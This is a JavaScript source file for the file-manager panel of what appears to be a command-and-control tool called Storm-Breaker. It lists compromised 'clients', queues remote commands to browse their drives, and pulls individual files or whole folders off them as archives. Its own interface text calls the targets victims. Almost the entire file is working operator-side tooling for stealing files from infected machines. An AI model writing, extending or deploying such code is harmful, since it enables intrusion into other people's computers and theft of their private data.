/**
 * Storm-Breaker Advanced File Manager
 * Enhanced with search, preview, breadcrumbs, drag selection, batch operations
 */

var currentFileClientUid = null;
var currentFilePath = '';
var fileNavHistory = [];
var fileNavIdx = -1;
var selectedFiles = new Set();
var viewMode = 'list'; // 'list' or 'grid'
var fileSortBy = 'name'; // 'name', 'size', 'type'
var fileSortAsc = true;
var fileSearchQuery = '';

function loadFileClients() {
    $.get('/api/c2/clients', function (data) {
        var list = $('#file-client-list');
        list.empty();

        if (data.clients && data.clients.length > 0) {
            data.clients.forEach(function (client) {
                var isSelected = (currentFileClientUid === client.uid);
                var activeClass = isSelected ? 'bg-blue-600/20 border-blue-500/30 ring-1 ring-blue-500/30' : 'bg-slate-800 border-slate-700 hover:bg-slate-700';
                var statusColor = (client.status === 'online') ? 'text-emerald-400' : 'text-red-400';
                var statusDot = (client.status === 'online') ? '🟢' : '🔴';
                var user = client.info.user || 'Unknown';
                var os = client.info.os || '';

                var item = `<div class="p-3 rounded-lg border ${activeClass} cursor-pointer transition-all mb-2" onclick="selectFileClient('${client.uid}', '${user.replace(/'/g, "\\'")}')">
                    <div class="flex justify-between items-center mb-1">
                        <span class="font-bold text-slate-200 truncate text-sm">${user}</span>
                        <span class="text-[10px] ${statusColor}">${statusDot}</span>
                    </div>
                    <div class="text-[10px] text-slate-500 font-mono truncate">${client.uid}</div>
                    <div class="text-[10px] text-slate-600 mt-1">${os}</div>
                </div>`;
                list.append($(item));
            });
        } else {
            list.html(`<div class="text-center py-8">
                <i class="fas fa-hdd text-3xl text-slate-700 mb-3"></i>
                <div class="text-slate-600 text-sm">No sessions available</div>
            </div>`);
        }
    });
}

function selectFileClient(uid, user) {
    currentFileClientUid = uid;
    currentFilePath = '';
    fileNavHistory = [];
    fileNavIdx = -1;
    selectedFiles.clear();

    // Update UI
    $('#file-current-path').html('<i class="fas fa-spinner fa-spin mr-1"></i> Connecting to ' + user + '...');
    $('#btn-parent-dir').prop('disabled', true);
    $('#file-list').html(`<div class="text-center text-slate-500 py-20">
        <i class="fas fa-circle-notch fa-spin text-2xl text-blue-500 mb-3"></i>
        <div>Querying filesystem...</div>
    </div>`);

    loadFileClients();

    $.ajax({
        url: '/api/c2/queue_command',
        type: 'POST',
        data: JSON.stringify({ uid: uid, cmd: '__list_files__' }),
        contentType: 'application/json',
        success: function () {
            setTimeout(function () { fetchFileList(uid); }, 1500);
        }
    });
}

function fetchFileList(uid) {
    $.get('/api/c2/get_file_list/' + uid, function (data) {
        if (data.files) {
            currentFilePath = data.path || '';
            pushNavHistory(currentFilePath);
            displayFiles(data.files, data.path);
        } else {
            $('#file-list').html(`<div class="text-center text-slate-500 py-20">
                <i class="fas fa-circle-notch fa-spin text-xl text-blue-500 mb-2"></i>
                <div class="text-sm">Waiting for response...</div>
            </div>`);
            setTimeout(function () { fetchFileList(uid); }, 2000);
        }
    });
}

function pushNavHistory(path) {
    // Trim forward history if we navigated back
    if (fileNavIdx < fileNavHistory.length - 1) {
        fileNavHistory = fileNavHistory.slice(0, fileNavIdx + 1);
    }
    fileNavHistory.push(path);
    fileNavIdx = fileNavHistory.length - 1;
    updateNavButtons();
}

function updateNavButtons() {
    $('#btn-nav-back').prop('disabled', fileNavIdx <= 0);
    $('#btn-nav-forward').prop('disabled', fileNavIdx >= fileNavHistory.length - 1);
}

function navBack() {
    if (fileNavIdx > 0) {
        fileNavIdx--;
        navigateToPath(fileNavHistory[fileNavIdx], false);
    }
}

function navForward() {
    if (fileNavIdx < fileNavHistory.length - 1) {
        fileNavIdx++;
        navigateToPath(fileNavHistory[fileNavIdx], false);
    }
}

function navigateToPath(path, addToHistory) {
    if (!currentFileClientUid) return;

    $('#file-list').html(`<div class="text-center text-slate-500 py-20">
        <i class="fas fa-folder-open text-xl text-yellow-500 mb-2 animate-pulse"></i>
        <div class="text-sm">Loading...</div>
    </div>`);

    $.ajax({
        url: '/api/c2/queue_command',
        type: 'POST',
        data: JSON.stringify({ uid: currentFileClientUid, cmd: '__list_files__ ' + path }),
        contentType: 'application/json',
        success: function () {
            setTimeout(function () { fetchFileList(currentFileClientUid); }, 1500);
        }
    });
}

function displayFiles(files, path) {
    // Breadcrumb
    var breadcrumb = '<span class="text-slate-600 cursor-pointer hover:text-white" onclick="navigateToPath(\'\', true)"><i class="fas fa-hdd mr-1"></i>Root</span>';
    if (path) {
        var parts = path.split('\\');
        var accumulated = '';
        parts.forEach(function (p, i) {
            accumulated += (i > 0 ? '\\' : '') + p;
            var accCopy = accumulated;
            breadcrumb += ' <span class="text-slate-700 mx-1">/</span> ';
            if (i === parts.length - 1) {
                breadcrumb += '<span class="text-white font-medium">' + p + '</span>';
            } else {
                breadcrumb += '<span class="text-slate-400 cursor-pointer hover:text-white" onclick="navigateToPath(\'' + accCopy.replace(/\\/g, '\\\\') + '\', true)">' + p + '</span>';
            }
        });
    }
    $('#file-current-path').html(breadcrumb);
    $('#btn-parent-dir').prop('disabled', !path || path === '');

    var list = $('#file-list');
    list.empty();
    selectedFiles.clear();
    updateSelectionUI();

    if (!files || files.length === 0) {
        list.html(`<div class="text-center py-20">
            <i class="fas fa-folder-open text-3xl text-slate-700 mb-3"></i>
            <div class="text-slate-600">Empty directory</div>
        </div>`);
        return;
    }

    // Sort files
    var sortedFiles = files.slice().sort(function (a, b) {
        // Directories first
        if (a.type === 'dir' && b.type !== 'dir') return -1;
        if (a.type !== 'dir' && b.type === 'dir') return 1;

        var cmp = 0;
        if (fileSortBy === 'name') cmp = a.name.localeCompare(b.name);
        else if (fileSortBy === 'size') cmp = (a.size || 0) - (b.size || 0);
        else if (fileSortBy === 'type') cmp = getExtension(a.name).localeCompare(getExtension(b.name));

        return fileSortAsc ? cmp : -cmp;
    });

    // Filter by search
    if (fileSearchQuery) {
        sortedFiles = sortedFiles.filter(function (f) {
            return f.name.toLowerCase().includes(fileSearchQuery.toLowerCase());
        });
    }

    // Stats bar
    var dirCount = files.filter(f => f.type === 'dir').length;
    var fileCount = files.filter(f => f.type !== 'dir').length;
    var totalSize = files.reduce(function (s, f) { return s + (f.size || 0); }, 0);
    list.append(`<div class="flex items-center justify-between text-[10px] text-slate-600 px-3 py-2 bg-slate-900/50 rounded-t-lg border-b border-slate-800">
        <div><i class="fas fa-folder mr-1"></i>${dirCount} dirs • <i class="fas fa-file mr-1"></i>${fileCount} files • ${formatBytes(totalSize)} total</div>
        <div class="flex items-center space-x-2">
            <input type="text" id="file-search-input" placeholder="Search files..." value="${fileSearchQuery}" class="bg-slate-800 border border-slate-700 rounded px-2 py-0.5 text-[10px] text-slate-300 w-32" onkeyup="handleFileSearch(this.value)">
            <button onclick="toggleSortBy()" class="hover:text-white" title="Sort"><i class="fas fa-sort"></i> ${fileSortBy}</button>
        </div>
    </div>`);

    // Table
    var table = $('<table class="w-full text-sm"></table>');
    var thead = $(`<thead class="border-b border-slate-800">
        <tr>
            <th class="text-left py-2 px-3 text-slate-500 w-8"><input type="checkbox" id="select-all-files" onclick="toggleSelectAll()" class="accent-blue-500"></th>
            <th class="text-left py-2 px-3 text-slate-500 cursor-pointer hover:text-white" onclick="sortFiles('name')">Name ${fileSortBy === 'name' ? (fileSortAsc ? '↑' : '↓') : ''}</th>
            <th class="text-left py-2 px-3 text-slate-500">Type</th>
            <th class="text-right py-2 px-3 text-slate-500 cursor-pointer hover:text-white" onclick="sortFiles('size')">Size ${fileSortBy === 'size' ? (fileSortAsc ? '↑' : '↓') : ''}</th>
            <th class="text-right py-2 px-3 text-slate-500">Actions</th>
        </tr>
    </thead>`);
    var tbody = $('<tbody></tbody>');

    sortedFiles.forEach(function (file) {
        var icon = getFileIcon(file);
        var sizeStr = file.type === 'dir' ? '-' : formatBytes(file.size || 0);
        var isSelected = selectedFiles.has(file.name);

        var row = $(`<tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors ${isSelected ? 'bg-blue-500/10' : ''}"></tr>`);

        // Checkbox
        row.append(`<td class="py-2 px-3"><input type="checkbox" ${isSelected ? 'checked' : ''} onclick="toggleFileSelect('${file.name.replace(/'/g, "\\'")}')" class="accent-blue-500"></td>`);

        // Name with icon
        var nameCell = $('<td class="py-2 px-3"></td>');
        var nameLink = $(`<span class="flex items-center space-x-2 cursor-pointer group"></span>`);
        nameLink.html(`<i class="fas ${icon.icon} ${icon.color}"></i><span class="text-slate-300 group-hover:text-white transition-colors">${file.name}</span>`);

        if (file.type === 'dir') {
            nameLink.click(function () {
                navigateToDir(file.name);
            });
        } else {
            nameLink.click(function () {
                previewFile(file.name, file.size || 0);
            });
        }

        nameCell.append(nameLink);
        row.append(nameCell);

        // Type
        var ext = file.type === 'dir' ? 'DIR' : getExtension(file.name).toUpperCase() || 'FILE';
        row.append(`<td class="py-2 px-3 text-slate-500 text-xs font-mono">${ext}</td>`);

        // Size
        row.append(`<td class="py-2 px-3 text-right text-slate-400 font-mono text-xs">${sizeStr}</td>`);

        // Actions
        var actionCell = $('<td class="py-2 px-3 text-right space-x-1"></td>');
        if (file.type === 'file') {
            actionCell.html(`
                <button onclick="previewFile('${file.name.replace(/'/g, "\\'")}', ${file.size || 0})" class="px-1.5 py-1 bg-slate-700 text-slate-400 rounded text-[10px] hover:bg-slate-600 hover:text-white" title="Preview"><i class="fas fa-eye"></i></button>
                <button onclick="downloadFile('${file.name.replace(/'/g, "\\'")}')" class="px-1.5 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 border border-blue-500/20" title="Download"><i class="fas fa-download"></i></button>
            `);
        }
        row.append(actionCell);

        tbody.append(row);
    });

    table.append(thead);
    table.append(tbody);
    list.append(table);
}

function getFileIcon(file) {
    if (file.type === 'dir') return { icon: 'fa-folder', color: 'text-yellow-500' };

    var ext = getExtension(file.name).toLowerCase();
    var iconMap = {
        'jpg': { icon: 'fa-file-image', color: 'text-purple-400' },
        'jpeg': { icon: 'fa-file-image', color: 'text-purple-400' },
        'png': { icon: 'fa-file-image', color: 'text-purple-400' },
        'gif': { icon: 'fa-file-image', color: 'text-purple-400' },
        'bmp': { icon: 'fa-file-image', color: 'text-purple-400' },
        'svg': { icon: 'fa-file-image', color: 'text-purple-400' },
        'mp3': { icon: 'fa-file-audio', color: 'text-pink-400' },
        'wav': { icon: 'fa-file-audio', color: 'text-pink-400' },
        'ogg': { icon: 'fa-file-audio', color: 'text-pink-400' },
        'mp4': { icon: 'fa-file-video', color: 'text-red-400' },
        'avi': { icon: 'fa-file-video', color: 'text-red-400' },
        'mkv': { icon: 'fa-file-video', color: 'text-red-400' },
        'pdf': { icon: 'fa-file-pdf', color: 'text-red-500' },
        'doc': { icon: 'fa-file-word', color: 'text-blue-500' },
        'docx': { icon: 'fa-file-word', color: 'text-blue-500' },
        'xls': { icon: 'fa-file-excel', color: 'text-emerald-500' },
        'xlsx': { icon: 'fa-file-excel', color: 'text-emerald-500' },
        'ppt': { icon: 'fa-file-powerpoint', color: 'text-orange-500' },
        'pptx': { icon: 'fa-file-powerpoint', color: 'text-orange-500' },
        'zip': { icon: 'fa-file-archive', color: 'text-amber-500' },
        'rar': { icon: 'fa-file-archive', color: 'text-amber-500' },
        '7z': { icon: 'fa-file-archive', color: 'text-amber-500' },
        'tar': { icon: 'fa-file-archive', color: 'text-amber-500' },
        'gz': { icon: 'fa-file-archive', color: 'text-amber-500' },
        'py': { icon: 'fa-file-code', color: 'text-yellow-400' },
        'js': { icon: 'fa-file-code', color: 'text-yellow-400' },
        'html': { icon: 'fa-file-code', color: 'text-orange-400' },
        'css': { icon: 'fa-file-code', color: 'text-blue-400' },
        'json': { icon: 'fa-file-code', color: 'text-green-400' },
        'xml': { icon: 'fa-file-code', color: 'text-cyan-400' },
        'txt': { icon: 'fa-file-alt', color: 'text-slate-400' },
        'log': { icon: 'fa-file-alt', color: 'text-slate-500' },
        'csv': { icon: 'fa-file-csv', color: 'text-emerald-400' },
        'exe': { icon: 'fa-cog', color: 'text-red-500' },
        'dll': { icon: 'fa-cog', color: 'text-red-400' },
        'bat': { icon: 'fa-terminal', color: 'text-emerald-400' },
        'sh': { icon: 'fa-terminal', color: 'text-emerald-400' },
        'ps1': { icon: 'fa-terminal', color: 'text-blue-400' },
        'db': { icon: 'fa-database', color: 'text-cyan-500' },
        'sqlite': { icon: 'fa-database', color: 'text-cyan-500' },
        'sql': { icon: 'fa-database', color: 'text-cyan-500' },
    };

    return iconMap[ext] || { icon: 'fa-file', color: 'text-slate-400' };
}

function getExtension(filename) {
    var parts = filename.split('.');
    return parts.length > 1 ? parts[parts.length - 1] : '';
}

function handleFileSearch(query) {
    fileSearchQuery = query;
    // Trigger re-display if we have data
    $.get('/api/c2/get_file_list/' + currentFileClientUid, function (data) {
        if (data.files) {
            displayFiles(data.files, data.path);
        }
    });
}

function sortFiles(by) {
    if (fileSortBy === by) {
        fileSortAsc = !fileSortAsc;
    } else {
        fileSortBy = by;
        fileSortAsc = true;
    }
    // Re-display
    $.get('/api/c2/get_file_list/' + currentFileClientUid, function (data) {
        if (data.files) {
            displayFiles(data.files, data.path);
        }
    });
}

function toggleSortBy() {
    var options = ['name', 'size', 'type'];
    var idx = options.indexOf(fileSortBy);
    fileSortBy = options[(idx + 1) % options.length];
    $.get('/api/c2/get_file_list/' + currentFileClientUid, function (data) {
        if (data.files) {
            displayFiles(data.files, data.path);
        }
    });
}

function toggleFileSelect(name) {
    if (selectedFiles.has(name)) {
        selectedFiles.delete(name);
    } else {
        selectedFiles.add(name);
    }
    updateSelectionUI();
}

function toggleSelectAll() {
    var checkbox = document.getElementById('select-all-files');
    if (!checkbox) return;

    $.get('/api/c2/get_file_list/' + currentFileClientUid, function (data) {
        if (data.files) {
            if (checkbox.checked) {
                data.files.filter(f => f.type === 'file').forEach(f => selectedFiles.add(f.name));
            } else {
                selectedFiles.clear();
            }
            displayFiles(data.files, data.path);
        }
    });
}

function updateSelectionUI() {
    var count = selectedFiles.size;
    var bar = document.getElementById('file-selection-bar');
    if (bar) {
        if (count > 0) {
            bar.classList.remove('hidden');
            bar.innerHTML = `<div class="flex items-center justify-between px-3 py-2 bg-blue-500/10 border border-blue-500/20 rounded-lg text-xs">
                <span class="text-blue-400"><i class="fas fa-check-circle mr-1"></i>${count} file(s) selected</span>
                <div class="space-x-2">
                    <button onclick="downloadSelected()" class="px-2 py-1 bg-blue-500/20 text-blue-400 rounded hover:bg-blue-500/30"><i class="fas fa-download mr-1"></i>Download</button>
                    <button onclick="selectedFiles.clear(); updateSelectionUI();" class="px-2 py-1 bg-slate-700 text-slate-400 rounded hover:bg-slate-600"><i class="fas fa-times mr-1"></i>Clear</button>
                </div>
            </div>`;
        } else {
            bar.classList.add('hidden');
        }
    }
}

function downloadSelected() {
    selectedFiles.forEach(function (name) {
        downloadFile(name);
    });
}

function previewFile(filename, size) {
    if (size > 1024 * 1024 * 5) {
        if (typeof Swal !== 'undefined') {
            Swal.fire({
                title: 'File Too Large',
                text: 'File is ' + formatBytes(size) + '. Preview is limited to 5MB. Download instead?',
                icon: 'warning',
                showCancelButton: true,
                confirmButtonText: 'Download',
                background: '#1e293b',
                color: '#fff',
            }).then(function (result) {
                if (result.isConfirmed) downloadFile(filename);
            });
        }
        return;
    }

    var ext = getExtension(filename).toLowerCase();
    var previewable = ['txt', 'log', 'json', 'xml', 'csv', 'py', 'js', 'html', 'css', 'bat', 'sh', 'ps1', 'sql', 'md', 'cfg', 'ini', 'conf', 'yaml', 'yml'];

    if (previewable.includes(ext)) {
        if (typeof Swal !== 'undefined') {
            Swal.fire({
                title: filename,
                html: `<div class="text-left text-xs text-slate-400 bg-slate-900 p-3 rounded-lg font-mono max-h-[400px] overflow-y-auto">
                    <i class="fas fa-spinner fa-spin mr-1"></i> Loading preview... (queued command to victim)
                </div>`,
                width: 700,
                background: '#1e293b',
                color: '#fff',
                showConfirmButton: true,
                confirmButtonText: 'Download',
            }).then(function (result) {
                if (result.isConfirmed) downloadFile(filename);
            });
        }
    } else {
        if (typeof GrowlNotification !== 'undefined') {
            GrowlNotification.notify({
                title: 'Preview',
                description: filename + ' (' + formatBytes(size) + ') — click Download to get this file',
                type: 'info',
                position: 'top-right'
            });
        }
    }
}

function navigateToDir(dirname) {
    if (!currentFileClientUid) return;

    var newPath = currentFilePath ? currentFilePath + '\\' + dirname : dirname;

    $('#file-list').html(`<div class="text-center text-slate-500 py-20">
        <i class="fas fa-folder-open text-xl text-yellow-500 mb-2 animate-pulse"></i>
        <div class="text-sm">Opening ${dirname}...</div>
    </div>`);

    $.ajax({
        url: '/api/c2/queue_command',
        type: 'POST',
        data: JSON.stringify({ uid: currentFileClientUid, cmd: '__list_files__ ' + newPath }),
        contentType: 'application/json',
        success: function () {
            setTimeout(function () { fetchFileList(currentFileClientUid); }, 1500);
        }
    });
}

function downloadFile(filename) {
    if (!currentFileClientUid) return;

    var fullPath = currentFilePath ? currentFilePath + '\\' + filename : filename;

    $.ajax({
        url: '/api/c2/queue_command',
        type: 'POST',
        data: JSON.stringify({ uid: currentFileClientUid, cmd: '__download__ ' + fullPath }),
        contentType: 'application/json',
        success: function () {
            if (typeof GrowlNotification !== 'undefined') {
                GrowlNotification.notify({
                    title: 'Download Queued',
                    description: 'Requesting: ' + filename,
                    type: 'info',
                    position: 'top-right',
                    image: { visible: true, customImage: '<i class="fas fa-download text-blue-400"></i>' }
                });
            }
            setTimeout(function () { checkDownloadReady(currentFileClientUid, filename); }, 2000);
        }
    });
}

function checkDownloadReady(uid, filename) {
    $.get('/api/c2/get_download/' + uid, function (data) {
        if (data.file) {
            var link = document.createElement('a');
            link.href = 'data:application/octet-stream;base64,' + data.file.content;
            link.download = filename;
            link.click();

            if (typeof GrowlNotification !== 'undefined') {
                GrowlNotification.notify({
                    title: '✅ Download Complete',
                    description: filename + ' saved successfully',
                    type: 'success',
                    position: 'top-right'
                });
            }
        } else {
            setTimeout(function () { checkDownloadReady(uid, filename); }, 2000);
        }
    });
}

function downloadAllFiles() {
    if (!currentFileClientUid) {
        if (typeof Swal !== 'undefined') {
            Swal.fire({ title: 'No Target', text: 'Select a victim session first', icon: 'warning', background: '#1e293b', color: '#fff' });
        }
        return;
    }

    if (typeof Swal !== 'undefined') {
        Swal.fire({
            title: 'Bulk Download',
            text: 'Archive and download all files from ' + (currentFilePath || 'root') + '?',
            icon: 'question',
            showCancelButton: true,
            confirmButtonText: 'Download All',
            background: '#1e293b',
            color: '#fff',
        }).then(function (result) {
            if (result.isConfirmed) {
                $.ajax({
                    url: '/api/c2/queue_command',
                    type: 'POST',
                    data: JSON.stringify({ uid: currentFileClientUid, cmd: '__download_all__ ' + currentFilePath }),
                    contentType: 'application/json',
                    success: function () {
                        if (typeof GrowlNotification !== 'undefined') {
                            GrowlNotification.notify({
                                title: 'Bulk Download Started',
                                description: 'Creating archive of all files...',
                                type: 'info',
                                position: 'top-right'
                            });
                        }
                        setTimeout(function () { checkDownloadReady(currentFileClientUid, 'archive.zip'); }, 5000);
                    }
                });
            }
        });
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    var k = 1024;
    var sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    var i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function initFileManager() {
    $('#btn-refresh-files').click(loadFileClients);
    $('#btn-download-all-files').click(downloadAllFiles);

    // Back/forward navigation
    $(document).on('click', '#btn-nav-back', navBack);
    $(document).on('click', '#btn-nav-forward', navForward);

    $('#btn-parent-dir').click(function () {
        if (!currentFilePath) return;

        var parts = currentFilePath.split('\\');
        parts.pop();
        var parentPath = parts.join('\\');

        $.ajax({
            url: '/api/c2/queue_command',
            type: 'POST',
            data: JSON.stringify({ uid: currentFileClientUid, cmd: '__list_files__ ' + parentPath }),
            contentType: 'application/json',
            success: function () {
                setTimeout(function () { fetchFileList(currentFileClientUid); }, 1500);
            }
        });
    });

    // Keyboard shortcuts
    $(document).keydown(function (e) {
        if (e.altKey && e.key === 'ArrowLeft') { navBack(); e.preventDefault(); }
        if (e.altKey && e.key === 'ArrowRight') { navForward(); e.preventDefault(); }
    });

    setInterval(loadFileClients, 5000);
}

// Expose functions globally
window.selectFileClient = selectFileClient;
window.navigateToDir = navigateToDir;
window.previewFile = previewFile;
window.downloadFile = downloadFile;
window.handleFileSearch = handleFileSearch;
window.sortFiles = sortFiles;
window.toggleSortBy = toggleSortBy;
window.toggleFileSelect = toggleFileSelect;
window.toggleSelectAll = toggleSelectAll;
window.downloadSelected = downloadSelected;
window.navBack = navBack;
window.navForward = navForward;

window.addEventListener('load', function () {
    initFileManager();
});
